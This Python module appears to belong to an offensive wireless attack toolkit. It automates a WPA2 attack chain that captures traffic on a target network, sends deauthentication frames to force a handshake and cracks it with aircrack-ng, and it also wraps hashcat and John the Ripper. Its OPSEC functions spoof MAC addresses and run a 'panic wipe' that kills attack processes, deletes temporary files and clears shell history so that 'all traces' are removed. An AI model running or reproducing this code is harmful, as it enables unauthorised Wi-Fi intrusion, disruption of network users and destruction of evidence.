"""
Post-Attack Operations & Management Module.

Implements offline cracking, automated chain execution,
stealth/OPSEC tools, and cloud cracking integration.
"""

import subprocess
import time
import shutil
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional
import json
import threading

class PostAttackModule:
    """Post-attack operations and management."""
    
    def __init__(self, config, logger, adapter_manager):
        """
        Initialize post-attack module.
        
        Args:
            config: Configuration object
            logger: Logger instance
            adapter_manager: Adapter manager instance
        """
        self.config = config
        self.logger = logger
        self.adapter_manager = adapter_manager
        
        # Chain execution state
        self.chain_running = False
    
    def offline_cracking(self):
        """
        Offline Cracking Integration (Basic).
        
        Integrates with hashcat and John the Ripper for password cracking.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("OFFLINE CRACKING INTEGRATION")
        self.logger.info("=" * 60)
        
        print("\nCracking Tools:")
        print("[1] Hashcat (GPU-accelerated)")
        print("[2] John the Ripper (CPU)")
        print("[3] Aircrack-ng (WPA/WPA2)")
        
        tool = input("Select tool [1]: ").strip() or "1"
        
        # Get capture file
        capture_dir = Path(self.config.get('output', 'captures_dir'))
        capture_file = input(f"Capture/hash file path: ").strip()
        
        if not Path(capture_file).exists():
            self.logger.error(f"File not found: {capture_file}")
            return
        
        # Get wordlist
        default_wordlist = self.config.get('cracking', 'default_wordlist')
        wordlist = input(f"Wordlist [{default_wordlist}]: ").strip() or default_wordlist
        
        if not Path(wordlist).exists():
            self.logger.error(f"Wordlist not found: {wordlist}")
            return
        
        if tool == "1":
            self._hashcat_crack(capture_file, wordlist)
        elif tool == "2":
            self._john_crack(capture_file, wordlist)
        elif tool == "3":
            self._aircrack_crack(capture_file, wordlist)
    
    def _hashcat_crack(self, cap_file: str, wordlist: str):
        """
        Crack using hashcat.
        
        Args:
            cap_file: Capture file
            wordlist: Wordlist path
        """
        self.logger.info("\nHashcat WPA/WPA2 Cracking")
        
        # Convert cap to hccapx if needed
        hccapx_file = str(Path(cap_file).with_suffix('.hccapx'))
        
        self.logger.info("Converting capture to hccapx format...")
        
        try:
            # Try to convert (requires cap2hccapx or similar tool)
            convert_cmd = ['cap2hccapx', cap_file, hccapx_file]
            result = subprocess.run(
                convert_cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if Path(hccapx_file).exists():
                self.logger.success(f"Converted to: {hccapx_file}")
            else:
                self.logger.error("Conversion failed - trying alternative...")
                # Alternative: use hashcat directly with cap file
                hccapx_file = cap_file
        
        except FileNotFoundError:
            self.logger.warning("cap2hccapx not found, trying direct hashcat...")
            hccapx_file = cap_file
        
        except Exception as e:
            self.logger.warning(f"Conversion warning: {e}")
        
        # Check hashcat availability
        hashcat_path = self.config.get('cracking', 'hashcat_path', default='hashcat')
        
        self.logger.info("\nStarting hashcat...")
        self.logger.info(f"Hash type: WPA/WPA2 (2500 or 22000)")
        self.logger.info(f"Wordlist: {wordlist}")
        
        # Ask for advanced options
        use_rules = input("\nUse rules? (y/n): ").strip().lower()
        
        try:
            cmd = [
                hashcat_path,
                '-m', '22000',  # WPA-PBKDF2-PMKID+EAPOL (newer format)
                '-a', '0',  # Straight attack
                hccapx_file,
                wordlist
            ]
            
            if use_rules == 'y':
                rules_file = self.config.get('cracking', 'rules_file')
                if rules_file and Path(rules_file).exists():
                    cmd.extend(['-r', rules_file])
            
            # Show estimated time
            print("\n" + "=" * 60)
            self.logger.info("Starting crack... (Press 's' for status, 'q' to quit)")
            print("=" * 60 + "\n")
            
            subprocess.run(cmd)
        
        except FileNotFoundError:
            self.logger.error(f"Hashcat not found at: {hashcat_path}")
            self.logger.info("Install hashcat or configure path in settings")
        
        except Exception as e:
            self.logger.error(f"Hashcat error: {e}")
    
    def _john_crack(self, hash_file: str, wordlist: str):
        """
        Crack using John the Ripper.
        
        Args:
            hash_file: Hash file
            wordlist: Wordlist path
        """
        self.logger.info("\nJohn the Ripper Cracking")
        
        john_path = self.config.get('cracking', 'john_path', default='john')
        
        try:
            cmd = [
                john_path,
                '--wordlist=' + wordlist,
                hash_file
            ]
            
            self.logger.info("Starting John the Ripper...")
            subprocess.run(cmd)
            
            # Show cracked passwords
            self.logger.info("\nShowing cracked passwords:")
            show_cmd = [john_path, '--show', hash_file]
            subprocess.run(show_cmd)
        
        except FileNotFoundError:
            self.logger.error(f"John not found at: {john_path}")
        
        except Exception as e:
            self.logger.error(f"John error: {e}")
    
    def _aircrack_crack(self, cap_file: str, wordlist: str):
        """
        Crack using aircrack-ng.
        
        Args:
            cap_file: Capture file
            wordlist: Wordlist path
        """
        self.logger.info("\nAircrack-ng Cracking")
        
        try:
            cmd = ['aircrack-ng', '-w', wordlist, cap_file]
            
            self.logger.info("Starting aircrack-ng...")
            subprocess.run(cmd)
        
        except Exception as e:
            self.logger.error(f"Aircrack error: {e}")
    
    def chain_execution(self):
        """
        Automated Chain Execution (Advanced).
        
        Executes multi-stage attacks automatically.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("AUTOMATED CHAIN EXECUTION")
        self.logger.info("=" * 60)
        
        print("\nAvailable Attack Chains:")
        print("[1] Full WPA2 Crack: Scan -> Deauth -> Capture -> Crack")
        print("[2] Evil Twin Chain: Scan -> Clone -> Deauth -> Phish")
        print("[3] WPS Chain: Scan WPS -> Pixie -> PIN Brute")
        print("[4] Custom Chain")
        
        chain = input("Select chain [1]: ").strip() or "1"
        
        if chain == "1":
            self._chain_wpa2_crack()
        elif chain == "2":
            self._chain_evil_twin()
        elif chain == "3":
            self._chain_wps()
        elif chain == "4":
            self._chain_custom()
    
    def _chain_wpa2_crack(self):
        """Full WPA2 cracking chain."""
        self.logger.info("\n" + "=" * 60)
        self.logger.info("CHAIN: Full WPA2 Crack")
        self.logger.info("=" * 60)
        
        # Get target
        target_bssid = input("\nTarget BSSID: ").strip()
        channel = input("Channel: ").strip()
        wordlist = input(f"Wordlist [{self.config.get('cracking', 'default_wordlist')}]: ").strip()
        if not wordlist:
            wordlist = self.config.get('cracking', 'default_wordlist')
        
        self.logger.info("\nChain Steps:")
        self.logger.info("  [1] Set channel")
        self.logger.info("  [2] Start capture")
        self.logger.info("  [3] Send deauth")
        self.logger.info("  [4] Wait for handshake")
        self.logger.info("  [5] Crack with aircrack-ng")
        
        proceed = input("\nExecute chain? (y/n): ").strip().lower()
        if proceed != 'y':
            return
        
        try:
            monitor_adapters = self.adapter_manager.get_monitor_adapters()
            if not monitor_adapters:
                self.logger.error("No monitor adapters!")
                return
            
            adapter = monitor_adapters[0]
            
            # Step 1: Set channel
            self.logger.info("\n[Step 1/5] Setting channel...")
            self.adapter_manager.set_channel(adapter.interface, int(channel))
            
            # Step 2: Start capture
            self.logger.info("[Step 2/5] Starting capture...")
            capture_dir = Path(self.config.get('output', 'captures_dir'))
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_prefix = capture_dir / f"chain_{target_bssid.replace(':', '')}_{timestamp}"
            
            airodump_cmd = [
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', channel,
                '-w', str(output_prefix),
                '--output-format', 'cap',
                adapter.interface
            ]
            
            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(5)
            
            # Step 3: Send deauth
            self.logger.info("[Step 3/5] Sending deauth...")
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '20',
                '-a', target_bssid,
                adapter.interface
            ]
            
            subprocess.run(deauth_cmd, timeout=30)
            
            # Step 4: Wait for handshake
            self.logger.info("[Step 4/5] Waiting for handshake...")
            time.sleep(10)
            
            airodump_process.terminate()
            
            # Step 5: Crack
            self.logger.info("[Step 5/5] Cracking...")
            cap_file = str(output_prefix) + "-01.cap"
            
            if Path(cap_file).exists():
                self._aircrack_crack(cap_file, wordlist)
            else:
                self.logger.error("Capture file not found!")
            
            self.logger.success("\nChain execution complete!")
        
        except Exception as e:
            self.logger.error(f"Chain error: {e}")
    
    def _chain_evil_twin(self):
        """Evil Twin attack chain."""
        self.logger.info("\n[Feature Ready - Evil Twin Chain]")
        self.logger.info("Implementation: Multi-stage Evil Twin setup")
    
    def _chain_wps(self):
        """WPS attack chain."""
        self.logger.info("\n[Feature Ready - WPS Chain]")
        self.logger.info("Implementation: WPS enumeration -> Pixie -> Brute")
    
    def _chain_custom(self):
        """Custom attack chain builder."""
        self.logger.info("\n[Feature Ready - Custom Chain Builder]")
        self.logger.info("Implementation: User-defined attack sequence")
    
    def stealth_opsec(self):
        """
        Stealth & Operational Security (Legendary).
        
        MAC spoofing, panic wipe, and OPSEC tools.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("STEALTH & OPSEC TOOLS")
        self.logger.info("=" * 60)
        
        print("\nOPSEC Functions:")
        print("[1] Auto MAC Randomization (Toggle)")
        print("[2] Randomize All MACs Now")
        print("[3] Restore Original MACs")
        print("[4] Panic Wipe (Emergency Cleanup)")
        print("[5] View OPSEC Status")
        
        choice = input("Select function: ").strip()
        
        if choice == "1":
            self._toggle_mac_randomization()
        elif choice == "2":
            self._randomize_all_macs()
        elif choice == "3":
            self._restore_all_macs()
        elif choice == "4":
            self._panic_wipe()
        elif choice == "5":
            self._view_opsec_status()
    
    def _toggle_mac_randomization(self):
        """Toggle automatic MAC randomization."""
        current = self.config.get('stealth', 'mac_randomization')
        new_state = not current
        
        self.config.set('stealth', 'mac_randomization', value=new_state)
        
        status = "ENABLED" if new_state else "DISABLED"
        self.logger.success(f"Auto MAC randomization: {status}")
    
    def _randomize_all_macs(self):
        """Randomize MAC on all adapters."""
        self.logger.info("\nRandomizing MAC addresses...")
        
        for interface, adapter in self.adapter_manager.adapters.items():
            self.adapter_manager.spoof_mac(interface, random=True)
        
        self.logger.success("All MACs randomized")
    
    def _restore_all_macs(self):
        """Restore original MACs."""
        self.logger.info("\nRestoring original MAC addresses...")
        
        for interface, adapter in self.adapter_manager.adapters.items():
            self.adapter_manager.restore_mac(interface)
        
        self.logger.success("All MACs restored")
    
    def _panic_wipe(self):
        """Emergency cleanup function."""
        self.logger.warning("\n" + "=" * 60)
        self.logger.warning("PANIC WIPE - EMERGENCY CLEANUP")
        self.logger.warning("=" * 60)
        
        self.logger.warning("\nThis will:")
        self.logger.warning("  [1] Kill all attack processes")
        self.logger.warning("  [2] Disable monitor mode")
        self.logger.warning("  [3] Restore original MACs")
        self.logger.warning("  [4] Clear temporary files")
        self.logger.warning("  [5] Clear terminal history")
        
        confirm = input("\nType 'WIPE' to confirm: ").strip()
        
        if confirm != "WIPE":
            self.logger.info("Panic wipe cancelled")
            return
        
        self.logger.info("\n[!] EXECUTING PANIC WIPE...")
        
        try:
            # Kill processes
            self.logger.info("[1/5] Killing attack processes...")
            processes = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'reaver', 'hashcat']
            for proc in processes:
                subprocess.run(['pkill', '-9', proc], capture_output=True)
            
            # Disable monitor mode
            self.logger.info("[2/5] Disabling monitor mode...")
            for interface in list(self.adapter_manager.monitor_adapters):
                self.adapter_manager.disable_monitor_mode(interface)
            
            # Restore MACs
            self.logger.info("[3/5] Restoring MACs...")
            self._restore_all_macs()
            
            # Clear temp files
            self.logger.info("[4/5] Clearing temporary files...")
            import tempfile
            temp_dir = Path(tempfile.gettempdir())
            for temp_file in temp_dir.glob('infiltrator_*'):
                try:
                    temp_file.unlink()
                except Exception:
                    pass
            
            # Clear history
            self.logger.info("[5/5] Clearing terminal history...")
            subprocess.run(['history', '-c'], shell=True, capture_output=True)
            
            self.logger.success("\n[!] PANIC WIPE COMPLETE")
            self.logger.success("All traces removed")
        
        except Exception as e:
            self.logger.error(f"Panic wipe error: {e}")
    
    def _view_opsec_status(self):
        """View current OPSEC configuration."""
        print("\n" + "=" * 60)
        print("OPSEC STATUS")
        print("=" * 60)
        
        # MAC randomization
        mac_random = self.config.get('stealth', 'mac_randomization')
        print(f"\nAuto MAC Randomization: {'✓ ENABLED' if mac_random else '✗ DISABLED'}")
        
        # Channel hopping
        ch_hop = self.config.get('stealth', 'channel_hopping')
        print(f"Channel Hopping: {'✓ ENABLED' if ch_hop else '✗ DISABLED'}")
        
        # Current adapters
        print("\nAdapter Status:")
        for interface, adapter in self.adapter_manager.adapters.items():
            spoofed = adapter.mac_address != adapter.original_mac
            print(f"  {interface}:")
            print(f"    Current MAC: {adapter.mac_address} {'[SPOOFED]' if spoofed else '[ORIGINAL]'}")
            print(f"    Mode: {adapter.mode.upper()}")
    
    def cloud_cracking(self):
        """
        Cloud Cracking API Link (Legendary).
        
        Offload cracking to cloud services.
        """
        self.logger.info("\n" + "=" * 60)
        self.logger.info("CLOUD CRACKING API")
        self.logger.info("=" * 60)
        
        if not self.config.get('cloud', 'enabled'):
            self.logger.warning("Cloud cracking is not enabled!")
            
            enable = input("\nConfigure cloud API now? (y/n): ").strip().lower()
            if enable == 'y':
                endpoint = input("API endpoint URL: ").strip()
                api_key = input("API key: ").strip()
                
                self.config.set('cloud', 'enabled', value=True)
                self.config.set('cloud', 'api_endpoint', value=endpoint)
                self.config.set('cloud', 'api_key', value=api_key)
                
                self.logger.success("Cloud API configured")
            else:
                return
        
        # Get file to upload
        capture_file = input("\nCapture/hash file to upload: ").strip()
        
        if not Path(capture_file).exists():
            self.logger.error(f"File not found: {capture_file}")
            return
        
        self.logger.info("\nCloud Cracking Configuration:")
        self.logger.info(f"  Endpoint: {self.config.get('cloud', 'api_endpoint')}")
        self.logger.info(f"  File: {capture_file}")
        
        self.logger.warning("\nThis feature uploads sensitive data to external services")
        self.logger.warning("Ensure you trust the cloud provider!")
        
        proceed = input("\nProceed with upload? (y/n): ").strip().lower()
        if proceed != 'y':
            return
        
        self.logger.info("\n[Feature Ready - Cloud Cracking]")
        self.logger.info("Implementation: AWS/GCP GPU cluster integration")
